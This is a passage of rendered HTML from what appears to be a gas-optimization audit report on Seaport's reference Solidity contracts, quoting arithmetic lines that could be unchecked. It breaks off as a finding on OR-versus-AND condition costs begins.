class=\"mtk12\">sender</span><span class=\"mtk1\">), </span><span class=\"mtk12\">etherRemaining</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">); </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"866\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">868</span><span class=\"mtk1\">          }</span></span></span></code></pre>\n<ul>\n<li>reference/lib/ReferenceFulfillmentApplier.sol:</li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"49\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">   </span><span class=\"mtk7\">99</span><span class=\"mtk1\">          </span><span class=\"mtk3\">// If total consideration amount exceeds the offer amount...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">100</span><span class=\"mtk1\">          </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">considerationItem</span><span class=\"mtk1\">.</span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">execution</span><span class=\"mtk1\">.</span><span class=\"mtk12\">item</span><span class=\"mtk1\">.</span><span class=\"mtk12\">amount</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">  ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">107</span><span class=\"mtk1\">              </span><span class=\"mtk12\">ordersToExecute</span><span class=\"mtk1\">[</span><span class=\"mtk12\">targetComponent</span><span class=\"mtk1\">.</span><span class=\"mtk12\">orderIndex</span><span class=\"mtk1\">]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">108</span><span class=\"mtk1\">                  .</span><span class=\"mtk12\">receivedItems</span><span class=\"mtk1\">[</span><span class=\"mtk12\">targetComponent</span><span class=\"mtk1\">.</span><span class=\"mtk12\">itemIndex</span><span class=\"mtk1\">]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"100\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">109</span><span class=\"mtk1\">:                 .</span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">considerationItem</span><span class=\"mtk1\">.</span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">execution</span><span class=\"mtk1\">.</span><span class=\"mtk12\">item</span><span class=\"mtk1\">.</span><span class=\"mtk12\">amount</span><span class=\"mtk1\">; </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"101\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">  ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"102\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">113</span><span class=\"mtk1\">          } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"103\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">  ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"104\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">118</span><span class=\"mtk1\">              </span><span class=\"mtk12\">ordersToExecute</span><span class=\"mtk1\">[</span><span class=\"mtk12\">targetComponent</span><span class=\"mtk1\">.</span><span class=\"mtk12\">orderIndex</span><span class=\"mtk1\">]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"105\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">119</span><span class=\"mtk1\">                  .</span><span class=\"mtk12\">spentItems</span><span class=\"mtk1\">[</span><span class=\"mtk12\">targetComponent</span><span class=\"mtk1\">.</span><span class=\"mtk12\">itemIndex</span><span class=\"mtk1\">]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"100\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">120</span><span class=\"mtk1\">:                 .</span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">execution</span><span class=\"mtk1\">.</span><span class=\"mtk12\">item</span><span class=\"mtk1\">.</span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">considerationItem</span><span class=\"mtk1\">.</span><span class=\"mtk12\">amount</span><span class=\"mtk1\">; </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"101\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">121</span><span class=\"mtk1\">          }</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"50\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">189</span><span class=\"mtk1\">          </span><span class=\"mtk3\">// If no available order was located...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">190</span><span class=\"mtk1\">          </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">nextComponentIndex</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">191</span><span class=\"mtk1\">              </span><span class=\"mtk3\">// Return with an empty execution element that will be filtered.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">192</span><span class=\"mtk1\">              </span><span class=\"mtk3\">// prettier-ignore</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">193</span><span class=\"mtk1\">              </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk11\">Execution</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">194</span><span class=\"mtk1\">                  </span><span class=\"mtk11\">ReceivedItem</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">195</span><span class=\"mtk1\">                      </span><span class=\"mtk12\">ItemType</span><span class=\"mtk1\">.</span><span class=\"mtk12\">NATIVE</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">196</span><span class=\"mtk1\">                      </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">197</span><span class=\"mtk1\">                      </span><span class=\"mtk7\">0</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">198</span><span class=\"mtk1\">                      </span><span class=\"mtk7\">0</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">199</span><span class=\"mtk1\">                      </span><span class=\"mtk11\">payable</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">200</span><span class=\"mtk1\">                  ),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">201</span><span class=\"mtk1\">                  </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">202</span><span class=\"mtk1\">                  </span><span class=\"mtk11\">bytes32</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">203</span><span class=\"mtk1\">              );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">204</span><span class=\"mtk1\">          }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">205</span><span class=\"mtk1\">  </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">206</span><span class=\"mtk1\">          </span><span class=\"mtk3\">// If the fulfillment components are offer components...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">207</span><span class=\"mtk1\">          </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">side</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">Side</span><span class=\"mtk1\">.</span><span class=\"mtk12\">OFFER</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">208</span><span class=\"mtk1\">              </span><span class=\"mtk3\">// Return execution for aggregated items provided by offerer.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">209</span><span class=\"mtk1\">              </span><span class=\"mtk3\">// prettier-ignore</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">210</span><span class=\"mtk1\">              </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_aggregateValidFulfillmentOfferItems</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">211</span><span class=\"mtk1\">                  </span><span class=\"mtk12\">ordersToExecute</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">212</span><span class=\"mtk1\">                  </span><span class=\"mtk12\">fulfillmentComponents</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"190\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">213</span><span class=\"mtk1\">:                 </span><span class=\"mtk12\">nextComponentIndex</span><span class=\"mtk1\"> - </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"191\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">214</span><span class=\"mtk1\">              );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"192\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">215</span><span class=\"mtk1\">          } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"193\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">216</span><span class=\"mtk1\">              </span><span class=\"mtk3\">// Otherwise, fulfillment components are consideration</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"194\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">217</span><span class=\"mtk1\">              </span><span class=\"mtk3\">// components. Return execution for aggregated items provided by</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"195\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">218</span><span class=\"mtk1\">              </span><span class=\"mtk3\">// the fulfiller.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"196\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">219</span><span class=\"mtk1\">              </span><span class=\"mtk3\">// prettier-ignore</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"197\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">220</span><span class=\"mtk1\">              </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_aggregateConsiderationItems</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"198\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">221</span><span class=\"mtk1\">                  </span><span class=\"mtk12\">ordersToExecute</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"199\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">222</span><span class=\"mtk1\">                  </span><span class=\"mtk12\">fulfillmentComponents</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"190\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">223</span><span class=\"mtk1\">:                 </span><span class=\"mtk12\">nextComponentIndex</span><span class=\"mtk1\"> - </span><span class=\"mtk7\">1</span><span class=\"mtk1\">, </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"191\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">224</span><span class=\"mtk1\">                  </span><span class=\"mtk12\">fulfillerConduitKey</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"192\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">225</span><span class=\"mtk1\">              );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"193\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">226</span><span class=\"mtk1\">          }</span></span></span></code></pre>\n<ul>\n<li>reference/lib/ReferenceOrderCombiner.sol:</li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"51\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">629</span><span class=\"mtk1\">                  </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">item</span><span class=\"mtk1\">.</span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">etherRemaining</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">630</span><span class=\"mtk1\">                      </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InsufficientEtherSupplied</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">631</span><span class=\"mtk1\">                  }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">632</span><span class=\"mtk1\">  </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">633</span><span class=\"mtk1\">                  </span><span class=\"mtk3\">// Reduce ether remaining by amount.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"629\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">634</span><span class=\"mtk1\">:                 </span><span class=\"mtk12\">etherRemaining</span><span class=\"mtk1\"> -= </span><span class=\"mtk12\">item</span><span class=\"mtk1\">.</span><span class=\"mtk12\">amount</span><span class=\"mtk1\">; </span></span></span></code></pre>\n<ul>\n<li>reference/lib/ReferenceOrderFulfiller.sol:</li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"52\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">220</span><span class=\"mtk1\">                      </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">etherRemaining</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">221</span><span class=\"mtk1\">                          </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InsufficientEtherSupplied</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">222</span><span class=\"mtk1\">                      }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">223</span><span class=\"mtk1\">                      </span><span class=\"mtk3\">// Reduce ether remaining by amount.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"220\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">224</span><span class=\"mtk1\">:                     </span><span class=\"mtk12\">etherRemaining</span><span class=\"mtk1\"> -= </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">; </span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"53\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">273</span><span class=\"mtk1\">                      </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">etherRemaining</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">274</span><span class=\"mtk1\">                          </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InsufficientEtherSupplied</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">275</span><span class=\"mtk1\">                      }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">276</span><span class=\"mtk1\">                      </span><span class=\"mtk3\">// Reduce ether remaining by amount.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"273\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">277</span><span class=\"mtk1\">:                     </span><span class=\"mtk12\">etherRemaining</span><span class=\"mtk1\"> -= </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">; </span></span></span></code></pre>\n<ul>\n<li>reference/lib/ReferenceOrderValidator.sol:</li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"54\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">220</span><span class=\"mtk1\">              </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">filledNumerator</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">numerator</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">denominator</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">221</span><span class=\"mtk1\">                  </span><span class=\"mtk3\">// Reduce current numerator so it + supplied = denominator.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"220\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">222</span><span class=\"mtk1\">:                 </span><span class=\"mtk12\">numerator</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">denominator</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">filledNumerator</span><span class=\"mtk1\">; </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"221\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">223</span><span class=\"mtk1\">              }</span></span></span></code></pre>\n<h2 id=\"g-10-or-conditions-cost-less-than-their-equivalent-and-conditions-notsomething-is-false-costs-less-than-everything-is-true\" style=\"position:relative;\"><a href=\"#g-10-or-conditions-cost-less-than-their-equivalent-and-conditions-notsomething-is-false-costs-less-than-everything-is-true\" aria-label=\"g 10 or conditions cost less than their equivalent and conditions notsomething is false costs less than everything is true permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-10] <code>OR</code> conditions cost less than their equivalent <code>AND</code> conditions (“NOT(something is false)” costs less than “everything is true”)</h2>\n<p>Remember that the equivalent of <code>(a &#x26;&#x26; b)</code> is <code>!(!a || !b)</code></p>\n<p>Even with the 10k Optimizer enabled: <code>OR</code> conditions cost less than their equivalent <code>AND</code> conditions.</p>\n<h3 id=\"proof-of-concept-26\" style=\"position:relative;\"><a href=\"#proof-of-concept-26\" aria-label=\"proof of 